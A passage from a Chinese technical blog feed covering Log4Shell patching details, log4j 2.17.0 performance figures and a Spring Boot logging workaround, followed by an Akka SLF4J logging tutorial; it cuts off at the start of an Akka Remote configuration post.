&#123;</span><br><span class="line">        <span class="keyword">final</span> Class&lt;? extends StrLookup&gt; clazz = entry.getValue().getPluginClass().asSubclass(StrLookup.class);</span><br><span class="line"><span class="comment">//2021/12/13 修正</span></span><br><span class="line">        <span class="keyword">if</span> (!clazz.getName().equals(JndiLookup.class.getName()) || JndiManager.isJndiEnabled()) &#123;</span><br><span class="line">            strLookupMap.put(entry.getKey().toLowerCase(), ReflectionUtil.instantiate(clazz));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Throwable t) &#123;</span><br><span class="line">        handleError(entry.getKey(), t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2021/12/05</span></span><br><span class="line">修正MessagePatternConverter</span><br><span class="line">此版本主要为<span class="number">2.15</span>版本修正内容</span><br></pre></td></tr></table></figure><h2 id="6-可能带来问题"><a href="#6-可能带来问题" class="headerlink" title="6.可能带来问题"></a>6.可能带来问题</h2><h3 id="6-1-日志写入加大性能问题"><a href="#6-1-日志写入加大性能问题" class="headerlink" title="6.1.日志写入加大性能问题"></a>6.1.日志写入加大性能问题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">● log4j压测业务服务</span><br><span class="line">  ○ 压测结论升级log4j 2.17.0</span><br><span class="line">    ○ 同步立即刷盘降低2-3倍，改为同步缓存刷盘有少许提升，改为异步较大提升</span><br><span class="line">  ○ 详细压测数据</span><br><span class="line">    ■ log4j-2.8    同   步:  3000/s </span><br><span class="line">    ■ log4j-2.17.0 同   步:  1200/s</span><br><span class="line">    ■ log4j-2.17.0 同步缓存:  1400/s</span><br><span class="line">    ■ log4j-2.17.0 异步配置:  3300/s</span><br><span class="line">● 问题描述</span><br><span class="line">  ○ 升级log4j后续注意性能问题，写入日志量较多的话会有性能瓶颈，开了同步缓存会缓解一些，改为异步，比原来性能要高一些</span><br><span class="line">● 问题检查</span><br><span class="line">  ○ 检查一下业务线程是否有业务日志线程锁</span><br></pre></td></tr></table></figure><h3 id="6-2-spring升级不动"><a href="#6-2-spring升级不动" class="headerlink" title="6.2.spring升级不动"></a>6.2.spring升级不动</h3></li></ul><ul><li>重写log构建</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">public class Log4j2SystemExt extends Log4J2LoggingSystem &#123;</span><br><span class="line">public static final Map&lt;String, String&gt; SYSTEMS;</span><br><span class="line"></span><br><span class="line">static &#123;</span><br><span class="line">Map&lt;String, String&gt; systems = new LinkedHashMap&lt;String, String&gt;();</span><br><span class="line">systems.put(&quot;ch.qos.logback.core.Appender&quot;,</span><br><span class="line">&quot;org.springframework.boot.logging.logback.LogbackLoggingSystem&quot;);</span><br><span class="line">systems.put(&quot;org.apache.logging.log4j.core.impl.Log4jContextFactory&quot;,</span><br><span class="line">&quot;org.letter.spring.simple.Log4j2SystemExt&quot;);</span><br><span class="line">systems.put(&quot;java.util.logging.LogManager&quot;,</span><br><span class="line">&quot;org.springframework.boot.logging.java.JavaLoggingSystem&quot;);</span><br><span class="line">SYSTEMS = Collections.unmodifiableMap(systems);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static final String FILE_PROTOCOL = &quot;file&quot;;</span><br><span class="line"></span><br><span class="line">public Log4j2SystemExt(ClassLoader classLoader) &#123;</span><br><span class="line">super(classLoader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static void setExtLoggerSystem() &#123;</span><br><span class="line">try &#123;</span><br><span class="line">Class&lt;?&gt; clz = Class.forName(&quot;org.springframework.boot.logging.LoggingSystem&quot;);</span><br><span class="line">Field field = clz.getDeclaredField(&quot;SYSTEMS&quot;);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">Field modifiers = Field.class.getDeclaredField(&quot;modifiers&quot;);</span><br><span class="line">modifiers.setAccessible(true);</span><br><span class="line">modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">System.out.println(&quot;before setExtLoggerSystem: &quot; + field.get(null));</span><br><span class="line">field.set(null, Log4j2SystemExt.SYSTEMS);</span><br><span class="line">System.out.println(&quot;after setExtLoggerSystem: &quot; + field.get(null));</span><br><span class="line">modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">System.out.println(&quot;setExtLoggerSystem:&quot; + e.getMessage());</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line">protected void loadConfiguration(String location, LogFile logFile) &#123;</span><br><span class="line">Assert.notNull(location, &quot;Location must not be null&quot;);</span><br><span class="line">try &#123;</span><br><span class="line">LoggerContext ctx = (LoggerContext) LogManager.getContext(false);</span><br><span class="line">InputStream is = new ByteArrayInputStream(Log4jXmlConfig.log4jXml.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">ConfigurationSource source = new ConfigurationSource(is);</span><br><span class="line">ctx.start(ConfigurationFactory.getInstance().getConfiguration(ctx, source));</span><br><span class="line">&#125; catch (Exception ex) &#123;</span><br><span class="line">throw new IllegalStateException(</span><br><span class="line">&quot;Could not initialize Log4J2 logging from &quot; + location, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// 原有</span><br><span class="line">//@Override</span><br><span class="line">//protected void loadConfiguration(String location, LogFile logFile) &#123;</span><br><span class="line">//Assert.notNull(location, &quot;Location must not be null&quot;);</span><br><span class="line">//try &#123;</span><br><span class="line">//LoggerContext ctx =  (LoggerContext) LogManager.getContext(false);</span><br><span class="line">//URL url = ResourceUtils.getURL(location);</span><br><span class="line">//InputStream stream = url.openStream();</span><br><span class="line">//ConfigurationSource configurationSource = null;</span><br><span class="line">//if (FILE_PROTOCOL.equals(url.getProtocol())) &#123;</span><br><span class="line">//configurationSource = new ConfigurationSource(stream, ResourceUtils.getFile(url));</span><br><span class="line">//&#125; else &#123;</span><br><span class="line">//configurationSource = new ConfigurationSource(stream, url);</span><br><span class="line">//&#125;</span><br><span class="line">//ctx.start(ConfigurationFactory.getInstance().getConfiguration(ctx, configurationSource));</span><br><span class="line">//&#125;</span><br><span class="line">//catch (Exception ex) &#123;</span><br><span class="line">//throw new IllegalStateException(</span><br><span class="line">//&quot;Could not initialize Log4J2 logging from &quot; + location, ex);</span><br><span class="line">//&#125;</span><br><span class="line">//&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>配置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Log4j2SystemExt.setExtLoggerSystem();</span><br><span class="line"></span><br><span class="line">public class Log4jXmlConfig &#123;</span><br><span class="line">public static String log4jXml = &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot; +</span><br><span class="line">&quot;&lt;Configuration status=\&quot;WARN\&quot;&gt;\n&quot; +</span><br><span class="line">&quot;\t&lt;Properties&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;Property name=\&quot;PID\&quot;&gt;????&lt;/Property&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;Property name=\&quot;LOG_EXCEPTION_CONVERSION_WORD\&quot;&gt;%xwEx&lt;/Property&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;Property name=\&quot;LOG_LEVEL_PATTERN\&quot;&gt;%5p&lt;/Property&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;Property name=\&quot;LOG_PATTERN\&quot;&gt;%clr&#123;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125;&#125;&#123;faint&#125; %clr&#123;$&#123;LOG_LEVEL_PATTERN&#125;&#125; %clr&#123;$&#123;sys:PID&#125;&#125;&#123;magenta&#125; %clr&#123;---&#125;&#123;faint&#125; %clr&#123;[%15.15t]&#125;&#123;faint&#125; %clr&#123;%-40.40c&#123;1.&#125;&#125;&#123;cyan&#125; %clr&#123;:&#125;&#123;faint&#125; %m%n$&#123;sys:LOG_EXCEPTION_CONVERSION_WORD&#125;&lt;/Property&gt;\n&quot; +</span><br><span class="line">&quot;\t&lt;/Properties&gt;\n&quot; +</span><br><span class="line">&quot;\t&lt;Appenders&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;Console name=\&quot;Console\&quot; target=\&quot;SYSTEM_OUT\&quot; follow=\&quot;true\&quot;&gt;\n&quot; +</span><br><span class="line">&quot;\t\t\t&lt;PatternLayout pattern=\&quot;$&#123;LOG_PATTERN&#125;\&quot; /&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;/Console&gt;\n&quot; +</span><br><span class="line">&quot;\t&lt;/Appenders&gt;\n&quot; +</span><br><span class="line">&quot;\t&lt;Loggers&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;Logger name=\&quot;org.apache.catalina.startup.DigesterFactory\&quot; level=\&quot;error\&quot; /&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;Logger name=\&quot;org.apache.catalina.util.LifecycleBase\&quot; level=\&quot;error\&quot; /&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;Logger name=\&quot;org.apache.coyote.http11.Http11NioProtocol\&quot; level=\&quot;warn\&quot; /&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;logger name=\&quot;org.apache.sshd.common.util.SecurityUtils\&quot; level=\&quot;warn\&quot;/&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;Logger name=\&quot;org.apache.tomcat.util.net.NioSelectorPool\&quot; level=\&quot;warn\&quot; /&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;Logger name=\&quot;org.crsh.plugin\&quot; level=\&quot;warn\&quot; /&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;logger name=\&quot;org.crsh.ssh\&quot; level=\&quot;warn\&quot;/&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;Logger name=\&quot;org.eclipse.jetty.util.component.AbstractLifeCycle\&quot; level=\&quot;error\&quot; /&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;Logger name=\&quot;org.hibernate.validator.internal.util.Version\&quot; level=\&quot;warn\&quot; /&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;logger name=\&quot;org.springframework.boot.actuate.autoconfigure.CrshAutoConfiguration\&quot; level=\&quot;warn\&quot;/&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;logger name=\&quot;org.springframework.boot.actuate.endpoint.jmx\&quot; level=\&quot;warn\&quot;/&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;logger name=\&quot;org.thymeleaf\&quot; level=\&quot;warn\&quot;/&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;Root level=\&quot;info\&quot;&gt;\n&quot; +</span><br><span class="line">&quot;\t\t\t&lt;AppenderRef ref=\&quot;Console\&quot; /&gt;\n&quot; +</span><br><span class="line">&quot;\t\t&lt;/Root&gt;\n&quot; +</span><br><span class="line">&quot;\t&lt;/Loggers&gt;\n&quot; +</span><br><span class="line">&quot;&lt;/Configuration&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7-参考"><a href="#7-参考" class="headerlink" title="7.参考"></a>7.参考</h2><p><a href="https://www.oschina.net/news/174145/all-response-to-log4shell">https://www.oschina.net/news/174145/all-response-to-log4shell</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;CVE-2021-45105  CVE-2021-45046  CVE-2021-44832  CVE-2021-44228&lt;/p&gt;
&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.概述&quot;&gt;&lt;/a&gt;1.概述</summary>
      
    
    
    
    <category term="java" scheme="https://wuhaocn.github.io/categories/java/"/>
    
    
    <category term="log4j" scheme="https://wuhaocn.github.io/tags/log4j/"/>
    
  </entry>
  
  <entry>
    <title>Akka-SLF4J打印日志</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-SLF4J%E6%89%93%E5%8D%B0%E6%97%A5%E5%BF%97/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-SLF4J%E6%89%93%E5%8D%B0%E6%97%A5%E5%BF%97/</id>
    <published>2021-12-03T09:08:28.304Z</published>
    <updated>2021-12-03T09:09:32.964Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-用SLF4J-打印Akka日志"><a href="#1-用SLF4J-打印Akka日志" class="headerlink" title="1. 用SLF4J 打印Akka日志"></a>1. 用SLF4J 打印Akka日志</h2><pre><code>你可能注意到，我们直接将quoteResponse 打印到标准的输出是一个很不好的想法，让我们通过启用SLF4J Facade打印日志来修改这个。</code></pre><h3 id="1-1-通过日志来修复Actor类"><a href="#1-1-通过日志来修复Actor类" class="headerlink" title="1.1 通过日志来修复Actor类"></a>1.1 通过日志来修复Actor类</h3><p>Akka提供了一个非常小的trait 来打印日志，称为 ActorLogging。让我们来修改一下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">classTeacherLogActor extendsActor withActorLogging &#123;</span><br><span class="line"> </span><br><span class="line">   valquotes =List(</span><br><span class="line">    <span class="string">&quot;Moderation is for cowards&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Anything worth doing is worth overdoing&quot;</span>,</span><br><span class="line">    <span class="string">&quot;The trouble is you think you have time&quot;</span>,</span><br><span class="line">    <span class="string">&quot;You never gonna know if you never even try&quot;</span>)</span><br><span class="line"> </span><br><span class="line">  defreceive =&#123;</span><br><span class="line"> </span><br><span class="line">    caseQuoteRequest =&gt; &#123;</span><br><span class="line"> </span><br><span class="line">      importutil.Random</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//get a random element (for now)</span></span><br><span class="line">      valquoteResponse=QuoteResponse(quotes(Random.nextInt(quotes.size)))</span><br><span class="line">      log.info(quoteResponse.toString())</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">//We&#x27;ll cover the purpose of this method in the Testing section</span></span><br><span class="line">  defquoteList=quotes</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>   这里有点绕道。实际上，当我们以日志记下来一个message，ActorLogging 中的logging 方法已经将该消息publishes到了EventStream。那什么是EventStream？<br>​</p><h3 id="1-2-EventStream-and-Logging"><a href="#1-2-EventStream-and-Logging" class="headerlink" title="1.2 EventStream and Logging"></a>1.2 EventStream and Logging</h3><pre><code> EventStream的行为其实有点像消息中介，我们可以通过它发布和接收消息。和一般的MOM的微秒区别就是，EventStream的订阅者（subscribers）只能是Actor。在logging消息的场景，所有的log message都会发布到EventStream中。默认情况下，订阅这些消息的Actor是DefaultLogger ，它只是简单的将消息打印到标准输出。代码片段如下：</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">classDefaultLogger extendsActor withStdOutLogger &#123;  </span><br><span class="line">    overridedefreceive:Receive =&#123;</span><br><span class="line">        ...</span><br><span class="line">        caseevent:LogEvent ⇒ print(event)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>这就是为什么当我面再次启动StudentSimulatorApp程序的时候，我们看到日志消息被打印到终端。</code></pre><p>也就是说，EventStream不仅仅适合打日志。它是Actor世界中常用的public-subscribe机制。让我们再回到SLF4J</p><h3 id="1-3-配置Akka来启用SLF4J"><a href="#1-3-配置Akka来启用SLF4J" class="headerlink" title="1.3 配置Akka来启用SLF4J"></a>1.3 配置Akka来启用SLF4J</h3><p>代码片段如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">akka&#123;  </span><br><span class="line">    loggers =[<span class="string">&quot;akka.event.slf4j.Slf4jLogger&quot;</span>]</span><br><span class="line">    loglevel =<span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">    logging-filter =<span class="string">&quot;akka.event.slf4j.Slf4jLoggingFilter&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们将这些配置信息存储在名为application.conf文件中，这个文件需要配置在你的classpath里面。在我们的工程目录下，可以放在main/resources目录下面。<br>从这个配置中，我们可以<br>1、loggers属性表明，Actor将消息订阅到log Event中。 Slf4jLogger所做的仅仅是消费 log messages并将它放到SLF4J Logger facade里。<br>2、loglevel 属性表明，日志的输出级别。<br>3、logging-filter和loglevel 结合，传入日志消息的输出级别并将符合的消息publishing到EventStream中。<br>你可能会说，在之前的例子里怎么就没有application.conf文件呢？那是因为Akka提供了一些默认的配置属性。</p><h3 id="1-4-THROW-IN-A-logback-xml"><a href="#1-4-THROW-IN-A-logback-xml" class="headerlink" title="1.4 THROW IN A logback.xml"></a>1.4 THROW IN A logback.xml</h3><p>我们将通过logback.xml文件来配置SLF4J logger backed，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xmlversion=<span class="string">&quot;1.0&quot;</span>encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;  </span><br><span class="line">&lt;configuration&gt;  </span><br><span class="line">    &lt;appendername=<span class="string">&quot;FILE&quot;</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span><br><span class="line">        &lt;encoder&gt;</span><br><span class="line">            &lt;pattern&gt;%d&#123;HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;<span class="number">36</span>&#125; - %msg%n&lt;/pattern&gt;</span><br><span class="line">        &lt;/encoder&gt;</span><br><span class="line"> </span><br><span class="line">        &lt;rollingPolicyclass=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span><br><span class="line">            &lt;fileNamePattern&gt;logs\akka.%d&#123;yyyy-MM-dd&#125;.%i.log&lt;/fileNamePattern&gt;</span><br><span class="line">            &lt;timeBasedFileNamingAndTriggeringPolicy</span><br><span class="line">                      <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP&quot;</span>&gt;</span><br><span class="line">                &lt;maxFileSize&gt;50MB&lt;/maxFileSize&gt;</span><br><span class="line">            &lt;/timeBasedFileNamingAndTriggeringPolicy&gt;</span><br><span class="line">        &lt;/rollingPolicy&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;rootlevel=<span class="string">&quot;DEBUG&quot;</span>&gt;</span><br><span class="line">        &lt;appender-refref=<span class="string">&quot;FILE&quot;</span>/&gt;</span><br><span class="line">    &lt;/root&gt;</span><br><span class="line">&lt;/configuration&gt;  </span><br></pre></td></tr></table></figure><p> 同样将它放到 main/resources目录下面，你得确保 main/resources目录在你的eclipse或者其他IDE的 Classpath里面。同时，你得将logback 和slf4j-api加入到你的pom文件中或者build.sbt中，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">name :=<span class="string">&quot;AkkaNotes_Messaging&quot;</span></span><br><span class="line"> </span><br><span class="line">version :=<span class="string">&quot;1.0&quot;</span></span><br><span class="line"> </span><br><span class="line">organization :=<span class="string">&quot;com.arunma&quot;</span></span><br><span class="line"> </span><br><span class="line">scalaVersion :=<span class="string">&quot;2.11.2&quot;</span></span><br><span class="line"> </span><br><span class="line">resolvers ++=</span><br><span class="line">        Seq(<span class="string">&quot;repo&quot;</span>at <span class="string">&quot;http://repo.typesafe.com/typesafe/releases/&quot;</span>)</span><br><span class="line">             </span><br><span class="line">libraryDependencies ++=&#123;</span><br><span class="line">        valakkaVersion =<span class="string">&quot;2.3.4&quot;</span></span><br><span class="line">        valsprayVersion =<span class="string">&quot;1.3.1&quot;</span></span><br><span class="line">        Seq(</span><br><span class="line">            <span class="string">&quot;com.typesafe.akka&quot;</span>%%<span class="string">&quot;akka-actor&quot;</span>%akkaVersion,</span><br><span class="line">            <span class="string">&quot;io.spray&quot;</span>%%<span class="string">&quot;spray-can&quot;</span>%sprayVersion,</span><br><span class="line">            <span class="string">&quot;io.spray&quot;</span>%%<span class="string">&quot;spray-routing&quot;</span>%sprayVersion,</span><br><span class="line">            <span class="string">&quot;io.spray&quot;</span>%%<span class="string">&quot;spray-json&quot;</span>%<span class="string">&quot;1.2.6&quot;</span>,</span><br><span class="line">            <span class="string">&quot;com.typesafe.akka&quot;</span>%%<span class="string">&quot;akka-slf4j&quot;</span>%akkaVersion,</span><br><span class="line">            <span class="string">&quot;ch.qos.logback&quot;</span>%<span class="string">&quot;logback-classic&quot;</span>%<span class="string">&quot;1.1.2&quot;</span>,</span><br><span class="line">            <span class="string">&quot;com.typesafe.akka&quot;</span>%%<span class="string">&quot;akka-testkit&quot;</span>%akkaVersion, </span><br><span class="line">            <span class="string">&quot;org.scalatest&quot;</span>%%<span class="string">&quot;scalatest&quot;</span>%<span class="string">&quot;2.2.0&quot;</span></span><br><span class="line">            )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们再次启动StudentSimulatorApp的时候，并且发送消息到新的TeacherLogActor中，将会生成一个名为akkaxxxxx.log的文件，内容大概如下：<br><a href="https://www.iteblog.com/pic/akka/SLF4JLogging.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1634640266729-e10bead7-510f-430c-a276-d0fbb14e8140.png#clientId=u17e16d1a-90c9-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u1d3275c2&margin=%5Bobject%20Object%5D&originHeight=122&originWidth=1255&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u8900f147-e819-4ca0-bdee-3d975019064&title="></a><br>如果想及时了解<a href="https://www.iteblog.com/archives/tag/spark/">Spark</a>、Hadoop或者Hbase相关的文章，欢迎关注微信公共帐号：<strong>iteblog_hadoop</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-用SLF4J-打印Akka日志&quot;&gt;&lt;a href=&quot;#1-用SLF4J-打印Akka日志&quot; class=&quot;headerlink&quot; title=&quot;1. 用SLF4J 打印Akka日志&quot;&gt;&lt;/a&gt;1. 用SLF4J 打印Akka日志&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Remote-配置</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E9%85%8D%E7%BD%AE/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E9%85%8D%E7%BD%AE/</id>
    <published>2021-12-03T08:24:00.895Z</published>
    <updated>2021-12-03T08:42:23.494Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 